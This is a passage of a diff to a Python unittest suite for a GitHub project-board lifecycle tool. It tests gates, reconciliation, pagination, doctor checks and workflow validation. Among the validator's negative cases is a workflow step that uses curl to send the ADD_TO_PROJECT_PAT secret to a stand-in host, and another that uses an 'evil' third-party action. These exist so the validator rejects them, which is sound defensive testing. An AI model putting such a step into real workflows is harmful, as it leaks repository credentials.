@@ -2,7 +2,7 @@
 
 Covers: gate verdict tables, claim decisions (sole-assignee / blocked),
 the CLOSED five-repair reconciler set with never-repair negatives, repo-scoped
-ready-work merge + Priority sort + truncation flag, join-key normalization,
+ready-work merge + Priority sort + truncation flag, packet safety,
 and call-count budgets via an argv-recording fake runner. No network, no gh.
 """
 from __future__ import annotations
@@ -41,9 +41,9 @@ def _pr(number=10, state="MERGED", merged=True, base="main", author="me"):
 
 
 class StageOrderTest(unittest.TestCase):
-    def test_deployed_and_compounded_are_order_independent_refinements(self) -> None:
-        self.assertEqual(lb._ORDER["deployed"], lb._ORDER["shipped"])
-        self.assertEqual(lb._ORDER["compounded"], lb._ORDER["shipped"])
+    def test_exact_lifecycle(self) -> None:
+        self.assertEqual(lb.STAGES, ("stub", "brainstormed", "planned", "in_progress",
+                                    "in_review", "done", "abandoned"))
 
     def test_stage_at_least(self) -> None:
         self.assertTrue(lb.stage_at_least("in_review", "planned"))
@@ -53,7 +53,7 @@ class StageOrderTest(unittest.TestCase):
 
 
 class GateTest(unittest.TestCase):
-    """The idempotent entry-gate table: stage + artifact, never stage alone."""
+    """Status is the permission-gated lifecycle attestation."""
 
     def test_brainstorm_proceeds_on_stub(self) -> None:
         g = lb.evaluate_gate("brainstorm", "stub", True, None, None)
@@ -63,17 +63,16 @@ class GateTest(unittest.TestCase):
         g = lb.evaluate_gate("brainstorm", "brainstormed", True, None, "docs/brainstorms/x.md")
         self.assertEqual((g.verdict, g.route), ("already_done", "route_to_plan"))
 
-    def test_brainstorm_repairs_when_stage_lies_about_doc(self) -> None:
+    def test_brainstorm_status_does_not_depend_on_local_doc(self) -> None:
         g = lb.evaluate_gate("brainstorm", "brainstormed", True, None, None)
-        self.assertEqual(g.verdict, "repair_needed")
+        self.assertEqual((g.verdict, g.route), ("already_done", "route_to_plan"))
 
     def test_brainstorm_on_stage_beyond_brainstormed_never_repairs(self) -> None:
         # An item that legally skipped stub→planned has no brainstorm doc by
         # construction — the gate must not walk the board backwards.
         g = lb.evaluate_gate("brainstorm", "planned", True, None, None)
         self.assertEqual((g.verdict, g.route), ("already_done", "route_to_plan"))
-        for stage in ("in_progress", "in_review", "shipped", "deployed",
-                      "compounded", "abandoned"):
+        for stage in ("in_progress", "in_review", "done", "abandoned"):
             with self.subTest(stage=stage):
                 g = lb.evaluate_gate("brainstorm", stage, True, None, None)
                 self.assertEqual(g.verdict, "already_done")
@@ -83,32 +82,31 @@ class GateTest(unittest.TestCase):
         g = lb.evaluate_gate("plan", "planned", True, "docs/plans/x.md", None)
         self.assertEqual((g.verdict, g.route), ("already_done", "route_to_work"))
 
-    def test_plan_treats_planned_without_doc_as_ungroomed(self) -> None:
-        # A human dragged the card to planned; no join-keyed plan doc exists.
+    def test_plan_treats_planned_as_readiness_attestation(self) -> None:
         g = lb.evaluate_gate("plan", "planned", True, None, None)
-        self.assertEqual(g.verdict, "repair_needed")
+        self.assertEqual((g.verdict, g.route), ("already_done", "route_to_work"))
+
+    def test_plan_stops_on_done(self) -> None:
+        g = lb.evaluate_gate("plan", "done", True, None, None)
+        self.assertEqual((g.verdict, g.route), ("already_done", "none"))
 
     def test_work_requires_at_least_planned(self) -> None:
         g = lb.evaluate_gate("work", "brainstormed", True, None, None)
         self.assertEqual((g.verdict, g.route), ("route_to_plan", "plan"))
 
-    def test_work_gate_is_stage_plus_artifact(self) -> None:
-        # Scenario 5: stage says planned but no plan doc -> route back to plan.
+    def test_work_gate_depends_on_status_not_artifact(self) -> None:
         g = lb.evaluate_gate("work", "planned", True, None, None)
-        self.assertEqual(g.verdict, "route_to_plan")
+        self.assertEqual(g.verdict, "proceed")
         g = lb.evaluate_gate("work", "planned", True, "docs/plans/x.md", None)
         self.assertEqual(g.verdict, "proceed")
 
-    def test_work_gate_no_doc_reason_names_the_actual_stage(self) -> None:
-        # Issue #46: the reason is echoed verbatim by commands on STOP — a
-        # hard-coded "planned" misdirects the human when the stage is later.
+    def test_work_resume_reason_names_actual_stage(self) -> None:
         g = lb.evaluate_gate("work", "in_progress", True, None, None)
-        self.assertEqual(g.verdict, "route_to_plan")
+        self.assertEqual(g.verdict, "proceed")
         self.assertIn("in_progress", g.reason)
-        self.assertNotIn("planned", g.reason)
 
     def test_work_terminal_stages_are_already_done(self) -> None:
-        for stage in ("shipped", "deployed", "compounded", "abandoned"):
+        for stage in ("done", "abandoned"):
             with self.subTest(stage=stage):
                 g = lb.evaluate_gate("work", stage, True, "docs/plans/x.md", None)
                 self.assertEqual(g.verdict, "already_done")
@@ -116,12 +114,12 @@ class GateTest(unittest.TestCase):
     def test_compound_hotfix_path_without_issue(self) -> None:
         g = lb.evaluate_gate("compound", None, False, None, None)
         self.assertEqual(g.verdict, "proceed")
-        self.assertIn("skip the Status write", g.reason)
+        self.assertIn("independent of Status", g.reason)
 
-    def test_compound_stamps_only_from_shipped_or_deployed(self) -> None:
-        self.assertEqual(lb.evaluate_gate("compound", "shipped", True, None, None).verdict, "proceed")
-        self.assertEqual(lb.evaluate_gate("compound", "compounded", True, None, None).verdict, "already_done")
-        self.assertEqual(lb.evaluate_gate("compound", "in_review", True, None, None).verdict, "repair_needed")
+    def test_compound_never_mutates_lifecycle_status(self) -> None:
+        self.assertEqual(lb.evaluate_gate("compound", "in_review", True, None, None).verdict, "proceed")
+        self.assertEqual(lb.evaluate_gate("compound", "done", True, None, None).verdict, "proceed")
+        self.assertEqual(lb.evaluate_gate("compound", "abandoned", True, None, None).verdict, "already_done")
 
     def test_untrusted_author_is_surfaced(self) -> None:
         g = lb.evaluate_gate("plan", "stub", True, None, None, author_association="NONE")
@@ -148,12 +146,12 @@ class ClaimTest(unittest.TestCase):
 class ReconcilerTest(unittest.TestCase):
     """The repair set is CLOSED at five; everything else is a never-repair."""
 
-    def test_rule1_merged_close_missed_becomes_shipped(self) -> None:
+    def test_rule1_merged_close_missed_becomes_done(self) -> None:
         s = _issue(state="CLOSED", state_reason="COMPLETED", stage="in_review",
                    closing_prs=[_pr()])
         repairs, flags = lb.plan_repairs([s], "main")
         self.assertEqual([(r.rule, r.to_stage) for r in repairs],
-                         [("merged_close_missed", "shipped")])
+                         [("merged_close_missed", "done")])
         self.assertEqual(flags, [])
 
     def test_flag_in_review_with_open_subissues_never_repairs(self) -> None:
@@ -169,7 +167,7 @@ class ReconcilerTest(unittest.TestCase):
         self.assertEqual(flags, [])
 
     def test_rule2_not_planned_close_becomes_abandoned_with_cascade(self) -> None:
-        s = _issue(state="CLOSED", state_reason="NOT_PLANNED", stage="shipped",
+        s = _issue(state="CLOSED", state_reason="NOT_PLANNED", stage="done",
                    open_subs=[7, 8])
         repairs, _ = lb.plan_repairs([s], "main")
         self.assertEqual(repairs[0].rule, "not_planned_close")
@@ -219,7 +217,7 @@ class ReconcilerTest(unittest.TestCase):
 
     def test_never_repairs_human_drags(self) -> None:
         # Open issue, no PRs, arbitrary stage: reconciler must not touch it.
-        for stage in ("stub", "planned", "in_progress", "in_review", "shipped", "compounded"):
+        for stage in ("stub", "planned", "in_progress", "in_review", "done"):
             with self.subTest(stage=stage):
                 repairs, flags = lb.plan_repairs([_issue(stage=stage)], "main")
                 self.assertEqual((repairs, flags), ([], []))
@@ -241,6 +239,16 @@ class ReadyWorkTest(unittest.TestCase):
         ready, _ = lb.merge_ready_legs(items, {}, "o/r")
         self.assertEqual([r.number for r in ready], [1])
 
+    def test_missing_or_ambiguous_repo_metadata_fails_closed(self) -> None:
+        items = [
+            {"content": {"type": "Issue", "number": 1, "title": "missing"}},
+            self._item(2, repo=""),
+            self._item(3, repo={}),
+            self._item(4, repo={"nameWithOwner": "o/r"}),
+        ]
+        ready, _ = lb.merge_ready_legs(items, {}, "o/r")
+        self.assertEqual([r.number for r in ready], [4])
+
     def test_blocked_items_are_excluded(self) -> None:
         items = [self._item(1), self._item(2)]
         ready, _ = lb.merge_ready_legs(items, {2: 1}, "o/r")
@@ -258,17 +266,6 @@ class ReadyWorkTest(unittest.TestCase):
         self.assertTrue(truncated)
         _, truncated = lb.merge_ready_legs(items[:5], {}, "o/r")
         self.assertFalse(truncated)
-
-
-class JoinKeyTest(unittest.TestCase):
-    def test_bare_number_is_repo_local(self) -> None:
-        self.assertEqual(lb.normalize_join_key("42", "o/r"), "o/r#42")
-
-    def test_qualified_form(self) -> None:
-        self.assertEqual(lb.normalize_join_key("a/b#7", "o/r"), "a/b#7")
-
-    def test_placeholder_rejected(self) -> None:
-        self.assertIsNone(lb.normalize_join_key("NNN", "o/r"))
 
 
 class FakeRunner:
@@ -321,6 +318,19 @@ class ProjectLinkedReposTest(unittest.TestCase):
         runner = FakeRunner([(["api", "graphql"], fail)])
         self.assertIsNone(lb.project_linked_repos("o", 5, runner))
 
+    def test_paginates_past_one_hundred_linked_repositories(self) -> None:
+        first = json.dumps({"data": {"repositoryOwner": {"projectV2": {
+            "repositories": {"nodes": [{"nameWithOwner": f"o/r{i}"} for i in range(100)],
+                             "pageInfo": {"hasNextPage": True, "endCursor": "CURSOR"}}}}}})
+        second = json.dumps({"data": {"repositoryOwner": {"projectV2": {
+            "repositories": {"nodes": [{"nameWithOwner": f"o/r{i}"} for i in range(100, 150)],
+                             "pageInfo": {"hasNextPage": False, "endCursor": None}}}}}})
+        runner = FakeRunner([(["api", "graphql"], _ok(first)),
+                             (["api", "graphql"], _ok(second))])
+        linked = lb.project_linked_repos("o", 5, runner)
+        self.assertEqual(len(linked), 150)
+        self.assertIn("after=CURSOR", runner.calls[1])
+
 
 class ProjectWorkflowsTest(unittest.TestCase):
     """The built-in-workflow enabled-state reader behind the doctor's
@@ -347,6 +357,47 @@ class ProjectWorkflowsTest(unittest.TestCase):
         fail = subprocess.CompletedProcess(args=[], returncode=1, stdout="", stderr="boom")
         runner = FakeRunner([(["api", "graphql"], fail)])
         self.assertIsNone(lb.project_workflows("o", 5, runner))
+
+    def test_paginates_workflows(self) -> None:
+        first = json.dumps({"data": {"repositoryOwner": {"projectV2": {
+            "workflows": {"nodes": [{"name": "Other", "enabled": True}],
+                          "pageInfo": {"hasNextPage": True, "endCursor": "NEXT"}}}}}})
+        second = json.dumps({"data": {"repositoryOwner": {"projectV2": {
+            "workflows": {"nodes": [{"name": "Item closed", "enabled": True}],
+                          "pageInfo": {"hasNextPage": False, "endCursor": None}}}}}})
+        runner = FakeRunner([(["api", "graphql"], _ok(first)),
+                             (["api", "graphql"], _ok(second))])
+        self.assertTrue(lb.project_workflows("o", 5, runner)["Item closed"])
+        self.assertIn("after=NEXT", runner.calls[1])
+
+
+class ProjectAccessTest(unittest.TestCase):
+    """The read-only viewerCanUpdate query works for both Project owner types."""
+
+    def test_parses_user_and_organization_shapes(self) -> None:
+        for owner_type in ("User", "Organization"):
+            with self.subTest(owner_type=owner_type):
+                payload = json.dumps({"data": {"repositoryOwner": {
+                    "__typename": owner_type,
+                    "projectV2": {"id": "PVT_1", "viewerCanUpdate": True},
+                }}})
+                runner = FakeRunner([(["api", "graphql"], _ok(payload))])
+                access = lb.project_access("acme", 5, runner)
+                self.assertEqual(access, lb.ProjectAccess(owner_type, "PVT_1", True))
+
+    def test_fails_closed_on_missing_project_or_capability(self) -> None:
+        payloads = [
+            {"data": {"repositoryOwner": {"__typename": "Organization", "projectV2": None}}},
+            {"data": {"repositoryOwner": {"__typename": "Organization",
+                                            "projectV2": {"id": "PVT_1"}}}},
+            {"data": {"repositoryOwner": {"__typename": "Enterprise",
+                                            "projectV2": {"id": "PVT_1",
+                                                          "viewerCanUpdate": True}}}},
+        ]
+        for payload in payloads:
+            with self.subTest(payload=payload):
+                runner = FakeRunner([(["api", "graphql"], _ok(json.dumps(payload)))])
+                self.assertIsNone(lb.project_access("acme", 5, runner))
 
 
 class CallBudgetTest(unittest.TestCase):
@@ -878,6 +929,87 @@ class AutoAddWorkflowTest(unittest.TestCase):
         (wf / "ci.yml").write_text("on: push\njobs: {}\n", encoding="utf-8")
         self.assertIsNone(lb.find_auto_add_workflow(ctx))
 
+    def _write(self, text):
+        ctx, root = self._ctx()
+        wf = root / ".github" / "workflows"
+        wf.mkdir(parents=True)
+        (wf / "add.yml").write_text(text, encoding="utf-8")
+        return ctx
+
+    def test_structurally_validates_generated_workflow(self) -> None:
+        url = "https://github.com/orgs/acme/projects/5"
+        ctx = self._write(
+            "on:\n  issues:\n    types: [opened]\njobs:\n  add:\n    steps:\n"
+            "      - uses: actions/add-to-project@" + "a" * 40 + "\n"
+            "        with:\n          project-url: " + url + "\n"
+            "          github-token: ${{ secrets.ADD_TO_PROJECT_PAT }}\n")
+        inspection = lb.inspect_auto_add_workflow(ctx, url)
+        self.assertTrue(inspection.valid, inspection.detail)
+
+    def test_rejects_wrong_trigger_moving_ref_url_and_secret(self) -> None:
+        expected = "https://github.com/orgs/acme/projects/5"
+        ctx = self._write(
+            "on:\n  issues:\n    types: [reopened]\njobs:\n  add:\n    steps:\n"
+            "      - uses: actions/add-to-project@v2\n        with:\n"
+            "          project-url: https://github.com/users/acme/projects/5\n"
+            "          github-token: ${{ secrets.WRONG }}\n")
+        inspection = lb.inspect_auto_add_workflow(ctx, expected)
+        self.assertFalse(inspection.valid)
+        for fragment in ("issues/opened", "40-character", "project-url", "ADD_TO_PROJECT_PAT"):
+            self.assertIn(fragment, inspection.detail)
+
+    def test_comments_do_not_count_as_workflow(self) -> None:
+        ctx = self._write("# uses: actions/add-to-project@" + "a" * 40 + "\n")
+        self.assertIsNone(lb.find_auto_add_workflow(ctx))
+
+    def test_rejects_split_duplicate_or_scripted_credential_use(self) -> None:
+        url = "https://github.com/orgs/acme/projects/5"
+        sha = "a" * 40
+        cases = {
+            "split_steps": (
+                f"on:\n  issues:\n    types: [opened]\njobs:\n  add:\n    steps:\n"
+                f"      - uses: actions/add-to-project@{sha}\n"
+                f"      - name: misplaced inputs\n        with:\n          project-url: {url}\n"
+                "          github-token: ${{ secrets.ADD_TO_PROJECT_PAT }}\n"),
+            "wrong_input_parent": (
+                f"on:\n  issues:\n    types: [opened]\njobs:\n  add:\n    steps:\n"
+                f"      - uses: actions/add-to-project@{sha}\n        env:\n"
+                f"          project-url: {url}\n"
+                "          github-token: ${{ secrets.ADD_TO_PROJECT_PAT }}\n"),
+            "duplicate_action": (
+                f"on:\n  issues:\n    types: [opened]\njobs:\n  add:\n    steps:\n"
+                f"      - uses: actions/add-to-project@{sha}\n        with:\n"
+                f"          project-url: {url}\n"
+                "          github-token: ${{ secrets.ADD_TO_PROJECT_PAT }}\n"
+                f"      - uses: actions/add-to-project@{sha}\n"),
+            "extra_secret_run": (
+                f"on:\n  issues:\n    types: [opened]\njobs:\n  add:\n    steps:\n"
+                f"      - uses: actions/add-to-project@{sha}\n        with:\n"
+                f"          project-url: {url}\n"
+                "          github-token: ${{ secrets.ADD_TO_PROJECT_PAT }}\n"
+                "      - run: curl -d '${{ secrets.ADD_TO_PROJECT_PAT }}' example.invalid\n"),
+            "extra_other_action": (
+                f"on:\n  issues:\n    types: [opened]\njobs:\n  add:\n    steps:\n"
+                f"      - uses: evil/action@{'b' * 40}\n"
+                f"      - uses: actions/add-to-project@{sha}\n        with:\n"
+                f"          project-url: {url}\n"
+                "          github-token: ${{ secrets.ADD_TO_PROJECT_PAT }}\n"),
+            "extra_trigger": (
+                f"on:\n  issues:\n    types: [opened]\n  push:\n    branches: [main]\n"
+                f"jobs:\n  add:\n    steps:\n      - uses: actions/add-to-project@{sha}\n"
+                f"        with:\n          project-url: {url}\n"
+                "          github-token: ${{ secrets.ADD_TO_PROJECT_PAT }}\n"),
+            "duplicate_issue_trigger": (
+                f"on:\n  issues:\n    types: [opened]\n  issues:\n    types: [opened]\n"
+                f"jobs:\n  add:\n    steps:\n      - uses: actions/add-to-project@{sha}\n"
+                f"        with:\n          project-url: {url}\n"
+                "          github-token: ${{ secrets.ADD_TO_PROJECT_PAT }}\n"),
+        }
+        for name, text in cases.items():
+            with self.subTest(case=name):
+                inspection = lb.inspect_auto_add_workflow(self._write(text), url)
+                self.assertFalse(inspection.valid, inspection.detail)
+
 
 class ForwardBindingCheckTest(unittest.TestCase):
     """The pure per-branch doctor verdict (evaluate_forward_binding_check)."""
@@ -886,43 +1018,130 @@ class ForwardBindingCheckTest(unittest.TestCase):
         return lb.BindingConfig(forward_binding=forward, forward_raw=raw,
                                 backfilled_through=through, source="committed")
 
+    @staticmethod
+    def _inspection(path=None, valid=False, detail="missing", fix="fix it"):
+        return lb.AutoAddWorkflowInspection(path, valid, detail, fix)
+
     def test_unset_warns(self) -> None:
-        status, _detail, fix = lb.evaluate_forward_binding_check(self._binding(), None)
-        self.assertEqual(status, "WARN")
+        status, _detail, fix = lb.evaluate_forward_binding_check(
+            self._binding(), self._inspection())
+        self.assertEqual(status, "FAIL")
         self.assertIn(lb.CONFIG_KEY_FORWARD_BINDING, fix)
 
     def test_unrecognized_value_warns(self) -> None:
         status, detail, _fix = lb.evaluate_forward_binding_check(
-            self._binding(forward=None, raw="bogus"), None)
-        self.assertEqual(status, "WARN")
+            self._binding(forward=None, raw="bogus"), self._inspection())
+        self.assertEqual(status, "FAIL")
         self.assertIn("bogus", detail)
 
     def test_workflow_only_passes_without_orphan(self) -> None:
         status, _d, _f = lb.evaluate_forward_binding_check(
-            self._binding(forward="workflow-only"), None)
+            self._binding(forward="workflow-only"), self._inspection())
         self.assertEqual(status, "PASS")
 
-    def test_workflow_only_warns_on_orphaned_auto_add_file(self) -> None:
+    def test_workflow_only_fails_on_orphaned_auto_add_file(self) -> None:
         status, detail, _f = lb.evaluate_forward_binding_check(
-            self._binding(forward="workflow-only"), ".github/workflows/add-to-project.yml")
-        self.assertEqual(status, "WARN")
+            self._binding(forward="workflow-only"),
+            self._inspection(".github/workflows/add-to-project.yml"))
+        self.assertEqual(status, "FAIL")
         self.assertIn("add-to-project.yml", detail)
 
-    def test_auto_add_warns_when_file_missing(self) -> None:
+    def test_auto_add_fails_when_file_missing(self) -> None:
         status, _d, fix = lb.evaluate_forward_binding_check(
-            self._binding(forward="auto-add"), None)
-        self.assertEqual(status, "WARN")
-        self.assertIn("#63", fix)
+            self._binding(forward="auto-add"), self._inspection())
+        self.assertEqual(status, "FAIL")
+        self.assertIn("workflow-only", fix)
 
     def test_auto_add_passes_with_file_and_flags_secret_unverifiable(self) -> None:
         status, detail, _f = lb.evaluate_forward_binding_check(
-            self._binding(forward="auto-add"), ".github/workflows/add-to-project.yml")
+            self._binding(forward="auto-add"),
+            self._inspection(".github/workflows/add-to-project.yml", True, "validated", ""))
         self.assertEqual(status, "PASS")
         self.assertIn("secret", detail.lower())  # the write-only-secret caveat is explicit
 
     def test_none_passes(self) -> None:
-        status, _d, _f = lb.evaluate_forward_binding_check(self._binding(forward="none"), None)
+        status, _d, _f = lb.evaluate_forward_binding_check(
+            self._binding(forward="none"), self._inspection())
         self.assertEqual(status, "PASS")
+
+
+class DoctorVerdictTest(unittest.TestCase):
+    """Exercise the final verb_doctor verdict, not only individual helpers."""
+
+    def setUp(self) -> None:
+        self.tmp = tempfile.TemporaryDirectory()
+        self.addCleanup(self.tmp.cleanup)
+        self.ctx = lb.RepoContext(root=self.tmp.name, main_root=self.tmp.name,
+                                  origin_owner="acme", origin_repo="widget",
+                                  default_branch="main")
+        self.board = lb.BoardConfig("acme", 5, "committed")
+        self.schema = lb.BoardSchema("PVT_1", "F_STATUS",
+                                     {stage: f"O_{stage}" for stage in lb.STAGES}, "F_PRIORITY")
+
+    @staticmethod
+    def _runner(*, auth="github.com scopes: repo, project", issues=_ok("true\n")):
+        def run(args, timeout=None):
+            if args == ["auth", "status"]:
+                return _ok(auth)
+            if args[:2] == ["api", "repos/acme/widget"]:
+                return issues
+            if args[:2] == ["pr", "list"]:
+                return _ok("[]")
+            raise AssertionError(f"unexpected gh call: {args}")
+        return run
+
+    def _doctor(self, *, board=None, access=None, workflows=None, schema=..., linked=...,
+                auth="github.com scopes: repo, project", issues=_ok("true\n")):
+        board = self.board if board is ... else board
+        access = lb.ProjectAccess("Organization", "PVT_1", True) if access is ... else access
+        workflows = {"Item closed": True} if workflows is ... else workflows
+        schema = self.schema if schema is ... else schema
+        linked = [self.ctx.slug] if linked is ... else linked
+        with mock.patch.object(lb.shutil, "which", return_value="/usr/bin/gh"), \
+             mock.patch.object(lb, "_gh_version", return_value=(2, 94, 0)), \
+             mock.patch.object(lb, "read_board_config", return_value=board), \
+             mock.patch.object(lb, "project_access", return_value=access), \
+             mock.patch.object(lb, "resolve_schema", return_value=schema), \
+             mock.patch.object(lb, "project_workflows", return_value=workflows), \
+             mock.patch.object(lb, "project_linked_repos", return_value=linked), \
+             mock.patch.object(lb, "read_binding_config", return_value=lb.BindingConfig(
+                 "workflow-only", "workflow-only", None, "committed")), \
+             mock.patch.object(lb, "inspect_auto_add_workflow", return_value=
+                               lb.AutoAddWorkflowInspection(None, False, "missing", "fix")):
+            return lb.verb_doctor(self.ctx, self._runner(auth=auth, issues=issues))
+
+    def test_ready_for_personal_and_organization_project_shapes(self) -> None:
+        for owner_type in ("User", "Organization"):
+            with self.subTest(owner_type=owner_type):
+                result = self._doctor(board=..., access=lb.ProjectAccess(
+                    owner_type, "PVT_1", True), workflows=...)
+                self.assertTrue(result["ready"])
+
+    def test_critical_unknown_or_missing_cases_fail_final_verdict(self) -> None:
+        fail = subprocess.CompletedProcess(args=[], returncode=1, stdout="", stderr="denied")
+        cases = {
+            "board_missing": {"board": None, "access": None, "workflows": None},
+            "project_scope_missing": {"board": ..., "access": ..., "workflows": ...,
+                                      "auth": "github.com scopes: repo, read:project"},
+            "issues_unreadable": {"board": ..., "access": ..., "workflows": ...,
+                                  "issues": fail},
+            "write_access_unknown": {"board": ..., "access": None, "workflows": ...},
+            "write_access_denied": {"board": ..., "access": lb.ProjectAccess(
+                "Organization", "PVT_1", False), "workflows": ...},
+            "closed_workflow_unknown": {"board": ..., "access": ..., "workflows": None},
+            "closed_workflow_disabled": {"board": ..., "access": ...,
+                                         "workflows": {"Item closed": False}},
+            "priority_missing": {"board": ..., "access": ..., "workflows": ...,
+                                 "schema": lb.BoardSchema("PVT_1", "F_STATUS", {
+                                     stage: f"O_{stage}" for stage in lb.STAGES}, None)},
+            "repo_link_unknown": {"board": ..., "access": ..., "workflows": ...,
+                                  "linked": None},
+            "repo_not_linked": {"board": ..., "access": ..., "workflows": ...,
+                                "linked": []},
+        }
+        for name, kwargs in cases.items():
+            with self.subTest(case=name):
+                self.assertFalse(self._doctor(**kwargs)["ready"])
 
 
 class BackfillVerbTest(unittest.TestCase):
@@ -1046,7 +1265,7 @@ class FixtureReplayTest(unittest.TestCase):
     def _load(self, name: str):
         return json.loads((self.FIXTURES / name).read_text(encoding="utf-8"))
 
-    def test_project_field_list_resolves_all_nine_stages(self) -> None:
+    def test_project_field_list_resolves_all_seven_stages(self) -> None:
         payload = self._load("project_field_list.json")
         status, priority = lb.parse_field_list(payload)
         self.assertIsNotNone(status)
@@ -1101,7 +1320,7 @@ class GroomRouteTest(unittest.TestCase):
 
     def _route(self, **kw):
         base = dict(has_issue=True, stage=None, plan_doc=None, brainstorm_doc=None,
-                    provenance="trusted", stale_join_key=False)
+                    provenance="trusted", stale_issue=False)
         base.update(kw)
         return lb.route_for_groom(**base)
 
@@ -1119,16 +1338,15 @@ class GroomRouteTest(unittest.TestCase):
     def test_planned_with_doc_is_already_planned(self) -> None:
         self.assertEqual(self._route(stage="planned", plan_doc="p.md").route, "already_planned")
 
-    def test_planned_without_doc_is_repair(self) -> None:
-        self.assertEqual(self._route(stage="planned", plan_doc=None).route, "repair")
+    def test_planned_without_doc_is_already_planned(self) -> None:
+        self.assertEqual(self._route(stage="planned", plan_doc=None).route, "already_planned")
 
     def test_in_flight_stages_are_past(self) -> None:
         self.assertEqual(self._route(stage="in_progress").route, "past")
         self.assertEqual(self._route(stage="in_review").route, "past")
 
     def test_terminal_and_abandoned(self) -> None:
-        for s in ("shipped", "deployed", "compounded"):
-            self.assertEqual(self._route(stage=s).route, "terminal")
+        self.assertEqual(self._route(stage="done").route, "terminal")
         self.assertEqual(self._route(stage="abandoned").route, "abandoned")
 
     def test_untrusted_provenance_blocks_before_any_stage_routing(self) -> None:
@@ -1136,10 +1354,10 @@ class GroomRouteTest(unittest.TestCase):
         self.assertEqual(r.route, "blocked")
         self.assertEqual(r.blocker, "untrusted_provenance")
 
-    def test_stale_join_key_blocks(self) -> None:
-        r = self._route(stage=None, stale_join_key=True)
+    def test_missing_issue_blocks(self) -> None:
+        r = self._route(stage=None, stale_issue=True)
         self.assertEqual(r.route, "blocked")
-        self.assertEqual(r.blocker, "stale_join_key")
+        self.assertEqual(r.blocker, "issue_not_found")
 
 
 class ParseCreatedIssueNumberTest(unittest.TestCase):
@@ -1224,7 +1442,7 @@ class DecomposeVerbTest(unittest.TestCase):
             plan.write_text("---\ntitle: t\n---\n\nbody\n", encoding="utf-8")
             (root / "s1.md").write_text("sub1", encoding="utf-8")
             (root / "s2.md").write_text("sub2", encoding="utf-8")
-            spec = {"plan_path": "docs/plans/p.md", "sub_issues": [
+            spec = {"body_file": "docs/plans/p.md", "sub_issues": [
                 {"title": "core", "body_file": "s1.md"},
                 {"title": "follow", "body_file": "s2.md", "blocked_by": [0]}]}
             spec_path = root / "spec.json"
@@ -1257,8 +1475,8 @@ class DecomposeVerbTest(unittest.TestCase):
             self.assertEqual(out["sub_issues"][1]["blocked_by"], [183])
             self.assertEqual(out["dependencies_wired"], 1)
             self.assertEqual(seen["call"], (182, "planned"))
-            # join key stamped back into the plan frontmatter
-            self.assertIn("github_issue: 182", plan.read_text(encoding="utf-8"))
+            # GitHub is canonical; the transient body input is never modified.
+            self.assertEqual(plan.read_text(encoding="utf-8"), "---\ntitle: t\n---\n\nbody\n")
             # every queued gh response was consumed in the exact expected order
             self.assertEqual(runner.responses, [])
 
@@ -1276,9 +1494,29 @@ class DecomposeVerbTest(unittest.TestCase):
             self.assertEqual(cm.exception.code, "invalid_decompose_spec")
             self.assertEqual(runner.calls, [])  # no gh writes on a malformed spec
 
+    def test_missing_later_sub_body_is_preflighted_before_parent_write(self) -> None:
+        with tempfile.TemporaryDirectory() as d:
+            root = Path(d)
+            (root / "parent.md").write_text("parent", encoding="utf-8")
+            (root / "s1.md").write_text("first", encoding="utf-8")
+            spec = {"body_file": "parent.md", "sub_issues": [
+                {"title": "first", "body_file": "s1.md"},
+                {"title": "missing", "body_file": "s2.md"}]}
+            spec_path = root / "spec.json"
+            spec_path.write_text(json.dumps(spec), encoding="utf-8")
+            runner = FakeRunner([])
+            with mock.patch.object(lb, "read_board_config",
+                                   return_value=lb.BoardConfig(owner="o", number=1,
+                                                               source="committed")):
+                with self.assertRaises(lb.BoardError) as caught:
+                    lb.verb_decompose(182, str(spec_path), _ctx(str(root)), runner,
+                                      set_status=lambda *a, **k: None)
+            self.assertEqual(caught.exception.code, "sub_body_missing")
+            self.assertEqual(runner.calls, [])
+
 
 class GroomVerifyVerbTest(unittest.TestCase):
-    """The postcondition verb: stage>=planned AND a join-keyed plan doc, with an
+    """The postcondition verb: Status>=planned, with an
     exact sub-issue/blocked count straight from the parent's sub-issue nodes."""
 
     @staticmethod
@@ -1315,11 +1553,11 @@ class GroomVerifyVerbTest(unittest.TestCase):
             self.assertEqual(out["sub_issues_with_dependencies"], 2)
             self.assertEqual(out["failures"], [])
 
-    def test_not_groomed_when_no_plan_doc(self) -> None:
+    def test_groomed_without_plan_doc(self) -> None:
         with tempfile.TemporaryDirectory() as d:
             out = self._run(Path(d), "planned", [])  # no plan file written
-            self.assertFalse(out["groomed"])
-            self.assertTrue(any("plan doc" in f for f in out["failures"]))
+            self.assertTrue(out["groomed"])
+            self.assertEqual(out["failures"], [])
 
     def test_not_groomed_when_stage_below_planned(self) -> None:
         with tempfile.TemporaryDirectory() as d:
@@ -1328,6 +1566,142 @@ class GroomVerifyVerbTest(unittest.TestCase):
             out = self._run(root, "brainstormed", [])
             self.assertFalse(out["groomed"])
             self.assertTrue(any("expected >= planned" in f for f in out["failures"]))
+
+
+class PacketVerbTest(unittest.TestCase):
+    @staticmethod
+    def _payload(stage="planned", state="OPEN"):
+        return json.dumps({"data": {"repository": {"issue": {
+            "number": 182, "title": "Implement packets", "body": "## Scope\nDo the work",
+            "updatedAt": "2026-07-20T12:00:00Z", "state": state,
+            "stateReason": "COMPLETED" if state == "CLOSED" else None,
+            "url": "https://github.com/o/r/issues/182", "authorAssociation": "MEMBER",
+            "blockedBy": {"totalCount": 1, "nodes": [{"number": 9, "title": "Foundation",
+                "url": "https://github.com/o/r/issues/9", "state": "OPEN"}]},
+            "assignees": {"nodes": []}, "closedByPullRequestsReferences": {"nodes": []},
+            "subIssues": {"nodes": [{"number": 183, "title": "Child", "body": "Child body",
+                "url": "https://github.com/o/r/issues/183", "state": "OPEN",
+                "blockedBy": {"totalCount": 1, "nodes": [{"number": 9,
+                    "title": "Foundation", "url": "https://github.com/o/r/issues/9",
+                    "state": "OPEN"}]}}]},
+            "projectItems": {"nodes": [{"id": "IT_1",
+                "project": {"id": "PJ", "number": 1, "owner": {"login": "o"}},
+                "fieldValueByName": {"name": stage}}]}}}}})
+
+    def _run(self, common, stage="planned", state="OPEN"):
+        ctx = _ctx(str(common / "worktree"))
+        runner = FakeRunner([(["api", "graphql"], _ok(self._payload(stage, state)))])
+        board = lb.BoardConfig(owner="o", number=1, source="committed")
+        return ctx, runner, board
+
+    def test_materialize_is_private_atomic_and_outside_worktree(self) -> None:
+        with tempfile.TemporaryDirectory() as d:
+            common = Path(d)
+            (common / "worktree").mkdir()
+            ctx, runner, board = self._run(common)
+            with mock.patch.object(lb, "read_board_config", return_value=board), \
+                    mock.patch.object(lb, "git_common_dir", return_value=common / ".git"):
